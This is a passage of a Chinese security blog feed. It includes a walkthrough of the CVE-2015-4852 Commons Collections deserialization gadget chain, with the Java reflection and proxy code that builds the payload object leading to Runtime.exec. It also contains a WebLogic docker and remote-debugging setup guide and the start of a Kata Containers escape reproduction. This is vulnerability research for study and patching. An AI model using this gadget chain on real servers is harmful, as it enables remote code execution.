<p>LazyMap实现了Map与Serializable接口，由于需要触发的是transform方法，因此需要找到一个函数能够调用transform方法，查看源代码，发现LazyMap的get方法会调用transform方法，且调用者是this.factory（正好是Transformer对象）</p>
<p><img src="/posts/754158022/image-20210617145059697.png" alt="image-20210617145059697"></p>
<p>跟进factory，可以发现，该变量是final修饰的Transformer变量，且可以通过调用public static Map decorate(Map map, Transformer factory)返回一个LazyMap的实例，为factory赋值为ChainedTransformer的对象，从而间接触发命令执行</p>
<p><img src="/posts/754158022/image-20210617171045930.png" alt="image-20210617171045930"></p>
<h5 id="4-4-LazyMap的get方法下断点调试"><a href="#4-4-LazyMap的get方法下断点调试" class="headerlink" title="4.4 LazyMap的get方法下断点调试"></a>4.4 LazyMap的get方法下断点调试</h5><p><img src="/posts/754158022/image-20210617172910549.png" alt="image-20210617172910549"></p>
<p>调用ChainedTransformer的transform方法执行，执行过程同4.2，在此不再阐述。</p>
<p><img src="/posts/754158022/image-20210617173136533.png" alt="image-20210617173136533"></p>
<h5 id="4-5-分析source入口函数"><a href="#4-5-分析source入口函数" class="headerlink" title="4.5 分析source入口函数"></a>4.5 分析source入口函数</h5><p>经过上面的分析，我们已经知道除了source入口之外的调用链：</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">-&gt;LazyMap.get()</span><br><span class="line">  -&gt;ChainedTransformer.transform()</span><br><span class="line">      -&gt;ConstantTransformer.transform()</span><br><span class="line">      -&gt;InvokerTransformer.transform()</span><br><span class="line">      		-&gt;Method.invoke()</span><br><span class="line">      			-&gt;Class.getMethod()</span><br><span class="line">      -&gt;InvokerTransformer.transform()</span><br><span class="line">      		-&gt;Method.invoke()</span><br><span class="line">      			-&gt;Runtime.getRuntime()</span><br><span class="line">      -&gt;InvokerTransformer.transform()</span><br><span class="line">      		-&gt;Method.invoke()</span><br><span class="line">      			-&gt;Runtime.exec()</span><br></pre></td></tr></tbody></table></figure>

<p>那么，现在剩下的工作就是找一个source入口函数，使得当服务器端进行反序列化，即执行readObject()函数的时候能够自动触发整个调用链，而不是我们自己手动触发。</p>
<p>那么需要找一个什么样的类呢，这里主要从LazyMap的get方法出发去找，为了能够调用LazyMap.get方法，首先这个类必定有一个属性是Map类型的，且这个类至少也是实现了Serializable类的。</p>
<p>经过一番寻找，找到了<code>AnnotationInvocationHandler</code>，该类是java运行库中的一个类，并且包含一个可控的<code>Map</code>对象属性<code>memberValues</code>，其<code>readObject</code>方法有自动修改自身Map属性的操作。因此，我们可以尝试找该属性调用get方法的地方，这样一旦将<code>memberValues</code>设置为LazyMap的实例，就会触发LazyMap的get方法，进一步触发命令执行</p>
<p><img src="/posts/754158022/image-20210618105813401.png" alt="image-20210618105813401"></p>
<p>可以看到<code>AnnotationInvocationHandler</code>实现了<code>InvocationHandler</code>接口，其中的invoke方法会触发get方法的执行，因此，此时就会自然而然想到如何执行invoke方法呢？那就不得不说一下动态代理技术。</p>
<p>动态代理比较常见的用处就是：<strong>一方面是代为执行具体类实例的方法，另一方面则在不修改类的源码的情况下,通过代理的方式为类的方法提供更多的功能。</strong></p>
<hr>
<p>一个简单的demo如下：(示例代码出处：<a href="https://www.freebuf.com/articles/web/214096.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/214096.html</a>)</p>
<p>Work接口需要实现work函数</p>
<figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Work</span> </span>{</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">work</span><span class="params">()</span></span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>Teacher类实现了Work接口</p>
<figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Teacher</span> <span class="keyword">implements</span> <span class="title">Work</span></span>{</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">work</span><span class="params">()</span> </span>{</span><br><span class="line">        System.out.println(<span class="string">"my work is teach students"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Teacher"</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p><code>WorkHandler</code>用来处理被代理对象，它必须继承<code>InvocationHandler</code>接口，并实现invoke方法</p>
<figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WorkHandler</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span></span>{</span><br><span class="line">    <span class="comment">//代理类中的真实对象</span></span><br><span class="line">    <span class="keyword">private</span> Object obj;</span><br><span class="line">    <span class="comment">//构造函数，给我们的真实对象赋值</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">WorkHandler</span><span class="params">(Object obj)</span> </span>{</span><br><span class="line">        <span class="keyword">this</span>.obj = obj;</span><br><span class="line">    }</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * proxy:代表动态代理对象</span></span><br><span class="line"><span class="comment">     * method：代表正在执行的方法</span></span><br><span class="line"><span class="comment">     * args：代表调用目标方法时传入的实参</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>{</span><br><span class="line">        <span class="comment">//在真实的对象执行之前我们可以添加自己的操作</span></span><br><span class="line">        System.out.println(<span class="string">"before invoke。。。"</span>);</span><br><span class="line">        <span class="comment">//java的反射功能，用来调用obj对象的method方法，传入参数为args</span></span><br><span class="line">        Object invoke = method.invoke(obj, args);</span><br><span class="line">        <span class="comment">//在真实的对象执行之后我们可以添加自己的操作</span></span><br><span class="line">        System.out.println(<span class="string">"after invoke。。。"</span>);</span><br><span class="line">        <span class="keyword">return</span> invoke;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>在Test类中通过<code>Proxy.newProxyInstance</code>创建动态代理对象proxy，这样当我们调用代理对象proxy的work方法的时候，<strong>实际上调用的是<code>WorkHandler</code>的invoke方法</strong>。</p>
<figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>{</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>{</span><br><span class="line">        <span class="comment">//要代理的真实对象</span></span><br><span class="line">        Work people = <span class="keyword">new</span> Teacher();</span><br><span class="line">        <span class="comment">//代理对象的调用处理程序，我们将要代理的真实对象传入代理对象的调用处理的构造函数中，</span></span><br><span class="line">        <span class="comment">//最终代理对象的调用处理程序会调用真实对象的方法</span></span><br><span class="line">        InvocationHandler handler = <span class="keyword">new</span> WorkHandler(people);</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 通过Proxy类的newProxyInstance方法创建代理对象，我们来看下方法中的参数</span></span><br><span class="line"><span class="comment">         * 第一个参数：people.getClass().getClassLoader()，使用handler对象的classloader对象来加载我们的代理对象</span></span><br><span class="line"><span class="comment">         * 第二个参数：people.getClass().getInterfaces()，这里为代理类提供的接口是真实对象实现的接口，</span></span><br><span class="line"><span class="comment">                     这样代理对象就能像真实对象一样调用接口中的所有方法</span></span><br><span class="line"><span class="comment">         * 第三个参数：handler，我们将代理对象关联到上面的InvocationHandler对象上</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        Work proxy = (Work)Proxy.newProxyInstance(people.getClass().getClassLoader(), people.getClass().getInterfaces(), handler);</span><br><span class="line">        System.out.println(proxy.work());</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>看一下输出结果，我们再没有改变Teacher类的前提下通过代理Work接口，实现了work函数调用的重写。</p>
<figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line">before invoke。。。</span><br><span class="line">my work is teach students</span><br><span class="line">after invoke。。。</span><br><span class="line">Teacher</span><br></pre></td></tr></tbody></table></figure>

<p><strong>综上所述：<code>Proxy.newProxyInstance(people.getClass().getClassLoader(), people.getClass().getInterfaces(), handler);</code>则是实现创建了一个接口的动态代理类及动态代理类对象，并指明了三个参数：用哪个类加载器加载这个类，该动态代理类实现了该接口所有方法，当调用接口中实现的任意方法时由谁去处理被代理对象（invoke方法）；</strong></p>
<p>针对上例，则是创建了一个代理了Work接口的动态代理类，当动态代理类对象proxy调用所代理接口Work中的任意方法时都会进入<strong><code>WorkHandler</code>的invoke方法</strong>去执行被代理对象的方法及其他相应操作，这里被代理的实际对象为Teacher，因此会执行Teacher的work方法。</p>
<p>在java的<code>java.lang.reflect</code>包下提供了一个<code>Proxy</code>类和一个<code>InvocationHandler</code>接口，通过这个类和这个接口可以生成JDK动态代理类和动态代理对象。生成动态代理类及对象的方法如下：(代码中涉及的Person接口类仅仅是一个示例)。</p>
<figure class="highlight"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">//创建一个与代理对象相关联的InvocationHandler</span></span><br><span class="line">InvocationHandler stuHandler = <span class="keyword">new</span> MyInvocationHandler&lt;Person&gt;(stu);</span><br><span class="line"><span class="comment">//创建一个代理对象stuProxy，代理对象的每个执行方法都会替换执行Invocation中的invoke方法</span></span><br><span class="line">Person stuProxy= (Person) Proxy.newProxyInstance(Person.class.getClassLoader(), new Class&lt;?&gt;[]{Person.class}, stuHandler);</span><br></pre></td></tr></tbody></table></figure>

<p>有关动态代理与静态代理更多的内容介绍，请参考：<a href="https://www.cnblogs.com/gonjan-blog/p/6685611.html" target="_blank" rel="noopener">java动态代理实现与原理详细分析</a>，本文不做具体阐述。</p>
<hr>
<p>言归正传，回到我们所使用的payload,其生成的代理类的代码如下：</p>
<p>因为<code>sun.reflect.annotation.AnnotationInvocationHandler</code>是一个内部API专用的类，在外部我们无法通过类名创建出<code>AnnotationInvocationHandler</code>类实例，所以我们需要通过反射的方式创建出<code>AnnotationInvocationHandler</code>对象：</p>
<figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">//通过Java反射获取AnnotationInvocationHandler类对象</span></span><br><span class="line">Class clazz = Class.forName( <span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span> );</span><br><span class="line"><span class="comment">//获取AnnotationInvocationHandler的构造方法</span></span><br><span class="line">Constructor cons = clazz.getDeclaredConstructor( Class<span class="class">.<span class="keyword">class</span>, <span class="title">Map</span>.<span class="title">class</span> )</span>;</span><br><span class="line"><span class="comment">//设置构造方法访问权限</span></span><br><span class="line">cons.setAccessible( <span class="keyword">true</span> );</span><br><span class="line"><span class="comment">//创建一个与代理对象相关联的InvocationHandler，设置的同时this.memberValues = lazyMap;</span></span><br><span class="line">InvocationHandler ih = ( InvocationHandler )cons.newInstance( Override<span class="class">.<span class="keyword">class</span>, <span class="title">lazyMap</span> )</span>;</span><br><span class="line"><span class="comment">//创建一个代理对象mapProxy来代理Map类接口，代理对象的每个执行方法都会替换执行InvocationHandler中的invoke方法</span></span><br><span class="line">Map mapProxy = ( Map ) Proxy.newProxyInstance</span><br><span class="line">    (</span><br><span class="line">    Map<span class="class">.<span class="keyword">class</span>.<span class="title">getClassLoader</span>(),</span></span><br><span class="line">    new  Class[] { Map.class },</span><br><span class="line">    ih</span><br><span class="line">);</span><br><span class="line"><span class="comment">//创建一个AnnotationInvocationHandler的实例用于序列化，并将this.memberValues = mapProxy;</span></span><br><span class="line">Object obj = cons.newInstance( Override<span class="class">.<span class="keyword">class</span>, <span class="title">mapProxy</span> )</span>;</span><br></pre></td></tr></tbody></table></figure>

<p>这样当执行反序列化操作的时候，会自动调用<code>this.memberValues.entrySet()</code>方法，如下图所示</p>
<p><img src="/posts/754158022/image-20210618161620515.png" alt="image-20210618161620515"></p>
<p>这样，由于是动态代理类，当调用mapProxy的entrySet方法时，会自动进入AnnotationInvocationHandler的invoke方法，进行判断</p>
<p>从而执行lazyMap的get方法</p>
<p><img src="/posts/754158022/image-20210618162947240.png" alt="image-20210618162947240"></p>
<p>至此，整个链全部打通，完整的调用链如下：</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">	ObjectInputStream.readObject()</span><br><span class="line">		AnnotationInvocationHandler.readObject()</span><br><span class="line">			Map(Proxy).entrySet()</span><br><span class="line">				AnnotationInvocationHandler.invoke()</span><br><span class="line">					LazyMap.get()</span><br><span class="line">						ChainedTransformer.transform()</span><br><span class="line">							ConstantTransformer.transform()</span><br><span class="line">							InvokerTransformer.transform()</span><br><span class="line">								Method.invoke()</span><br><span class="line">									Class.getMethod()</span><br><span class="line">							InvokerTransformer.transform()</span><br><span class="line">								Method.invoke()</span><br><span class="line">									Runtime.getRuntime()</span><br><span class="line">							InvokerTransformer.transform()</span><br><span class="line">								Method.invoke()</span><br><span class="line">									Runtime.exec()</span><br></pre></td></tr></tbody></table></figure>

<h5 id="4-6-AnnotationInvocationHandler-readObject-下断点调试"><a href="#4-6-AnnotationInvocationHandler-readObject-下断点调试" class="headerlink" title="4.6 AnnotationInvocationHandler.readObject()下断点调试"></a>4.6 AnnotationInvocationHandler.readObject()下断点调试</h5><p>在source入口点下断点远程调试如下：</p>
<p><img src="/posts/754158022/image-20210618163746078.png" alt="image-20210618163746078"></p>
<p>F5进入，下一步</p>
<p><img src="/posts/754158022/image-20210618163841814.png" alt="image-20210618163841814"></p>
<p>开始调用mapProxy的entrySet方法</p>
<p><img src="/posts/754158022/image-20210618164003656.png" alt="image-20210618164003656"></p>
<p><img src="/posts/754158022/image-20210618165056782.png" alt="image-20210618165056782"></p>
<p>下一步进入invoke方法，这里var2=java.util.Set java.util.Map.entrySet(),var1是mapProxy,</p>
<p><img src="/posts/754158022/image-20210618170432886.png" alt="image-20210618170432886"></p>
<p>因此var4的值不会进入if，会进入else</p>
<p><img src="/posts/754158022/image-20210618171209766.png" alt="image-20210618171209766"></p>
<p>进入else后再次判断var4的值，则进入Object var6所在代码</p>
<p><img src="/posts/754158022/image-20210618171338456.png" alt="image-20210618171338456"></p>
<p>此时，因为this.memberValues被设置为lazyMap，因此触发了lazyMap的get方法，相当于执行了lazyMap.get(“entrySet”)</p>
<p><img src="/posts/754158022/image-20210618171747895.png" alt="image-20210618171747895"></p>
<p><img src="/posts/754158022/image-20210618171817282.png" alt="image-20210618171817282"></p>
<p>从而进入了get方法</p>
<p><img src="/posts/754158022/image-20210618171952142.png" alt="image-20210618171952142"></p>
<p>判断是否包含这个key,进入59行</p>
<p><img src="/posts/754158022/image-20210618172724474.png" alt="image-20210618172724474"></p>
<p>执行transform,相当于执行ChainedTransform.transform(“entrySet”)</p>
<p><img src="/posts/754158022/image-20210618172825365.png" alt="image-20210618172825365"></p>
<p>最终调用命令执行</p>
<p><img src="/posts/754158022/image-20210618173140861.png" alt="image-20210618173140861"></p>
<p><img src="/posts/754158022/image-20210618173202233.png" alt="image-20210618173202233"></p>
<p><img src="/posts/754158022/image-20210618173222136.png" alt="image-20210618173222136"></p>
<p><img src="/posts/754158022/image-20210618173240794.png" alt="image-20210618173240794"></p>
<p>此时已经完成命令执行</p>
<p><img src="/posts/754158022/image-20210618173308466.png" alt="image-20210618173308466"></p>
<p>至此，整个执行过程和自动过程分析完成。</p>
<h4 id="5-漏洞修复"><a href="#5-漏洞修复" class="headerlink" title="5.漏洞修复"></a>5.漏洞修复</h4><p>​    该部分摘自<a href="https://blog.csdn.net/simonnews/article/details/105765017，" target="_blank" rel="noopener">https://blog.csdn.net/simonnews/article/details/105765017，</a></p>
<ol>
<li><p>ApacheCommons Collections组件修复：ApacheCommons Collections已经在3.2.2版本中做了修复，对这些不安全的Java类的序列化支持增加开关，默认为关闭状态，涉及的类包括CloneTransformer, ForClosure, InstantiateFactiory，InstantiateTransformer，InvokerTransformer，PrototypeCloneFactory，PrototypeSerialiZationFactory，WhileClosure。</p>
</li>
<li><p>weblogic修复补丁：CVE-2015-4852补丁主要应用在三个位置上，主要是进行黑名单绕过</p>
<p><img src="/posts/754158022/2020051423503659.png" alt="2020051423503659"></p>
</li>
</ol>
<h4 id="6-参考文献"><a href="#6-参考文献" class="headerlink" title="6.参考文献"></a>6.参考文献</h4><ul>
<li><a href="https://blog.csdn.net/simonnews/article/details/105765017" target="_blank" rel="noopener">https://blog.csdn.net/simonnews/article/details/105765017</a></li>
<li><a href="https://www.freebuf.com/articles/web/214096.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/214096.html</a></li>
<li><a href="https://www.cnblogs.com/0x7e/p/14529949.html" target="_blank" rel="noopener">https://www.cnblogs.com/0x7e/p/14529949.html</a></li>
<li><a href="https://www.chabug.org/audit/1151.html" target="_blank" rel="noopener">https://www.chabug.org/audit/1151.html</a></li>
<li><a href="https://www.cnblogs.com/gonjan-blog/p/6685611.html" target="_blank" rel="noopener">https://www.cnblogs.com/gonjan-blog/p/6685611.html</a></li>
<li><a href="https://functfan.gitbook.io/gewuzz/java-an-quan/fan-xu-lie-hua-lou-dong/ysoserial/java-fan-xu-lie-hua-zhi-commonscollections" target="_blank" rel="noopener">https://functfan.gitbook.io/gewuzz/java-an-quan/fan-xu-lie-hua-lou-dong/ysoserial/java-fan-xu-lie-hua-zhi-commonscollections</a></li>
<li><a href="https://badcode.cc/2018/03/15/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommons-Collections/" target="_blank" rel="noopener">https://badcode.cc/2018/03/15/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommons-Collections/</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/29804811" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/29804811</a></li>
</ul>
<!--
<div class="poem-wrap">
  <div class="poem-border poem-left"></div>
  <div class="poem-border poem-right"></div>
    <h1>念两句诗</h1>
    <p id="poem">挑选中...</p>
    <p id="info">

  <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
  <script type="text/javascript">
    jinrishici.load(function(result) {
      poem.innerHTML = result.data.content
      info.innerHTML = '【' + result.data.origin.dynasty + '】' + result.data.origin.author + '《' + result.data.origin.title + '》'
      document.getElementById("poem").value(poem);
      document.getElementById("info").value(info);  
  });
  </script>
</div>
-->

<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>CVE-2015-4852,Weblogic,反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>weblogic环境部署与远程调试</title>
    <url>/posts/2831946175/</url>
    <content><![CDATA[<br>
<blockquote class="blockquote-center">
<p id="hitokoto"></p>
<script src="https://v1.hitokoto.cn/?encode=js&amp;select=%23hitokoto" defer=""></script>
</blockquote>


<h2 id="主要内容"><a href="#主要内容" class="headerlink" title="主要内容"></a>主要内容</h2><p>​        因为最近要学习weblogic以及对其历史漏洞展开研究，包括漏洞基本原理分析，跟进代码审计，挖掘思路总结，修复方式整理，因此需要临时搭建一个weblogic环境以方便复现和调试代码（关键），经过前期的调研后，已经总结了windows上面和linux安装weblogic的方法，但由于平时使用linux系统多一点，因此选择在linux上面部署weblogic，于是乎调研了一番，最终以方便，快速，自动化为特征选择了奇安信师傅们开发的一款工具（<a href="https://github.com/QAX-A-Team/WeblogicEnvironment" target="_blank" rel="noopener">参考链接</a>），下面将具体搭建与调试步骤记录如下，以做总结。</p>
<h2 id="环境部署"><a href="#环境部署" class="headerlink" title="环境部署"></a>环境部署</h2><p>​        此方法要求机器上已经安装docker，如果未安装可以自行查找相关文档，此处不再介绍。安装完docker以后，对于weblogic的具体搭建过程则包括weblogic安装包下载，以及jdk包下载等过程，下面详细说明。</p>
<ol>
<li><p>从github(国外)或者gitee(国内，速度快)将安装脚本克隆到本地虚拟机：</p>
<p><img src="/posts/2831946175/image-20210615155011527.png" alt="image-20210615155011527"></p>
</li>
<li><p>cd切换到克隆后的目录，创建jdks与weblogics目录</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">mkdir jdks &amp;&amp; mkdir weblogics</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/posts/2831946175/image-20210615155509181.png" alt="image-20210615155509181"></p>
</li>
<li><p>执行安装脚本：(这里以weblogic10.3.6.0+jdk7u21为例说明)</p>
<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">./run_weblogic1036jdk7u21.sh</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/posts/2831946175/image-20210615155719396.png" alt="image-20210615155719396"></p>
</li>
<li><p>安装过程截图</p>
<p><img src="/posts/2831946175/image-20210615160109082.png" alt="image-20210615160109082"></p>
</li>
<li><p>安装完成</p>
<p><img src="/posts/2831946175/image-20210615161048374.png" alt="image-20210615161048374"></p>
</li>
<li><p>开启调试模式</p>
<p><img src="/posts/2831946175/image-20210615161211537.png" alt="image-20210615161211537"></p>
</li>
<li><p>通过url访问可看到已经部署成功。并已默认开启了远程调试模式。</p>
<p><img src="/posts/2831946175/image-20210615161343055.png" alt="image-20210615161343055"></p>
</li>
<li><p>导出weblogic的依赖Jar包进行远程调试</p>
<p>8.1 查看weblogic容器进程</p>
<p><img src="/posts/2831946175/image-20210615161840093.png" alt="image-20210615161840093"></p>
<p>8.2 使用下面的命令导出jar包,并导出tar.gz文件方便在装有IDEA的机器中进行远程调试</p>
<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">进入容器</span></span><br><span class="line">sudo docker exec -it weblogic1036jdk7u21 /bin/bash</span><br><span class="line">cd /u01/app/oracle/</span><br><span class="line">cp -r middleware/ /root/WeblogicEnvironment-master/</span><br><span class="line">exit</span><br><span class="line"><span class="meta">#</span><span class="bash">宿主机执行</span></span><br><span class="line">sudo docker cp 7a84dc24433b:/root/WeblogicEnvironment-master . </span><br><span class="line">sudo chown -R user:user WeblogicEnvironment-master</span><br><span class="line">tar czvf newfile.tar.gz WeblogicEnvironment-master</span><br></pre></td></tr></tbody></table></figure>
</li>
<li><p>（该步骤开启的可忽略）如果默认没开启，则按照以下步骤开启。</p>
<p>9.1 修改docker-compose.yml文件，开启8453端口</p>
<p><img src="/posts/2831946175/image-20210615165137029.png" alt="image-20210615165137029"></p>
<p>9.2 编辑配置脚本</p>
<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">cd u01/app/oracle/Domains/ExampleSilentWTDomain/bin/</span><br><span class="line">vi setDomainEnv.sh</span><br></pre></td></tr></tbody></table></figure>

<p>9.3 添加两行代码</p>
<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">debugFlag="true"</span><br><span class="line">export debugFlag</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/posts/2831946175/image-20210615165049175.png" alt="image-20210615165049175"></p>
</li>
</ol>
<h2 id="远程调试"><a href="#远程调试" class="headerlink" title="远程调试"></a>远程调试</h2><ol>
<li><p>打开idea，创建一个Java web工程，在idea中File-&gt;Project Structure里找到Libraries，添加modules。</p>
<p><img src="/posts/2831946175/image-20210615172959737.png" alt="image-20210615172959737"></p>
</li>
<li><p>然后配置远程调试，填写远程IP以及端口。</p>
<p><img src="/posts/2831946175/image-20210615173554603.png" alt="image-20210615173554603"></p>
</li>
<li><p>以CVE-2015-4852为例，因为我们知道是 commons-collections的InvokerTransformer出现的问题，所以断点直接下在transform()，开启idea的debug，然后用exp打过去，发现断点已经成功。</p>
<p><img src="/posts/2831946175/image-20210616094902165.png" alt="image-20210616094902165"></p>
<p><img src="/posts/2831946175/image-20210616094753181.png" alt="image-20210616094753181"></p>
</li>
<li><p>至此，远程调试完成。可以开始后续的代码审计了。</p>
</li>
</ol>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul>
<li><a href="https://www.cnblogs.com/0x7e/p/14529949.html" target="_blank" rel="noopener">https://www.cnblogs.com/0x7e/p/14529949.html</a></li>
<li><a href="https://github.com/QAX-A-Team/WeblogicEnvironment.git" target="_blank" rel="noopener">https://github.com/QAX-A-Team/WeblogicEnvironment.git</a></li>
</ul>
<!--
<div class="poem-wrap">
  <div class="poem-border poem-left"></div>
  <div class="poem-border poem-right"></div>
    <h1>念两句诗</h1>
    <p id="poem">挑选中...</p>
    <p id="info">

  <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
  <script type="text/javascript">
    jinrishici.load(function(result) {
      poem.innerHTML = result.data.content
      info.innerHTML = '【' + result.data.origin.dynasty + '】' + result.data.origin.author + '《' + result.data.origin.title + '》'
      document.getElementById("poem").value(poem);
      document.getElementById("info").value(info);  
  });
  </script>
</div>
-->

<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <categories>
        <category>环境部署</category>
      </categories>
      <tags>
        <tag>weblogic,环境部署,远程调试</tag>
      </tags>
  </entry>
  <entry>
    <title>KataContainers安全容器逃逸-CVE-2020-2023/2024/2025/2026(转载下)</title>
    <url>/posts/3535913925/</url>
    <content><![CDATA[<br>
<blockquote class="blockquote-center">
<p id="hitokoto"></p>
<script src="https://v1.hitokoto.cn/?encode=js&amp;select=%23hitokoto" defer=""></script>
</blockquote>

<h3 id="逃逸复现"><a href="#逃逸复现" class="headerlink" title="逃逸复现"></a>逃逸复现</h3><p><strong>环境准备</strong> </p>
<p>我们需要准备一套存在前述三个漏洞的Kata Containers环境，并配置其使用Cloud Hypervisor作为虚拟机管理程序。这里，笔者采用VMWare + Ubuntu18.04 + Docker + Kata Containers 1.10.0作为测试环境。 </p>
<p>首先，参照官方文档安装Docker[9]。接着，从Kata Containers官方Github仓库[10]下载1.10.0版本的静态程序包kata-static-1.10.3-x86_64.tar.xz，下载后进行安装即可，具体可参考如下步骤（需要root权限）： </p>
<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">set -e -x</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 下载安装包（如果已经下载，此步可跳过）</span></span><br><span class="line"><span class="meta">#</span><span class="bash">wget https://github.com/kata-containers/runtime/releases/download/1.10.0/kata-static-1.10.0-x86_64.tar.xz</span></span><br><span class="line">tar xf kata-static-1.10.0-x86_64.tar.xz</span><br><span class="line">rm -rf /opt/kata</span><br><span class="line">mv ./opt/kata /opt</span><br><span class="line">rmdir ./opt</span><br><span class="line">rm -rf /etc/kata-containers</span><br><span class="line">cp -r /opt/kata/share/defaults/kata-containers /etc/</span><br><span class="line"><span class="meta">#</span><span class="bash"> 使用Cloud Hypervisor作为虚拟机管理程序</span></span><br><span class="line">rm /etc/kata-containers/configuration.toml</span><br><span class="line">ln -s /etc/kata-containers/configuration-clh.toml /etc/kata-containers/configuration.toml</span><br><span class="line"><span class="meta">#</span><span class="bash"> 配置Docker</span></span><br><span class="line">mkdir -p /etc/docker/</span><br><span class="line">cat &lt;&lt; EOF &gt; /etc/docker/daemon.json</span><br><span class="line">{</span><br><span class="line">  "runtimes": {</span><br><span class="line">    "kata-runtime": {</span><br><span class="line">      "path": "/opt/kata/bin/kata-runtime"</span><br><span class="line">    },</span><br><span class="line">    "kata-clh": {</span><br><span class="line">      "path": "/opt/kata/bin/kata-clh"</span><br><span class="line">    },</span><br><span class="line">    "kata-qemu": {</span><br><span class="line">      "path": "/opt/kata/bin/kata-qemu"</span><br><span class="line">    }</span><br><span class="line">  },</span><br><span class="line">  "registry-mirrors": ["https://docker.mirrors.ustc.edu.cn/"]</span><br><span class="line">}</span><br><span class="line">EOF</span><br><span class="line">mkdir -p /etc/systemd/system/docker.service.d/</span><br><span class="line">cat &lt;&lt; EOF &gt; /etc/systemd/system/docker.service.d/kata-containers.conf</span><br><span class="line">[Service]</span><br><span class="line">ExecStart=</span><br><span class="line">ExecStart=/usr/bin/dockerd -D --add-runtime kata-runtime=/opt/kata/bin/kata-runtime --add-runtime kata-clh=/opt/kata/bin/kata-clh --add-runtime kata-qemu=/opt/kata/bin/kata-qemu --default-runtime=kata-runtime</span><br><span class="line">EOF</span><br><span class="line"><span class="meta">#</span><span class="bash"> 重载配置&amp;重新启动Docker</span></span><br><span class="line">systemctl daemon-reload &amp;&amp; systemctl restart docker</span><br></pre></td></tr></tbody></table></figure>

<p>安装完成。可以看一下Docker当前配置的runtime是否为Kata Containers：</p>
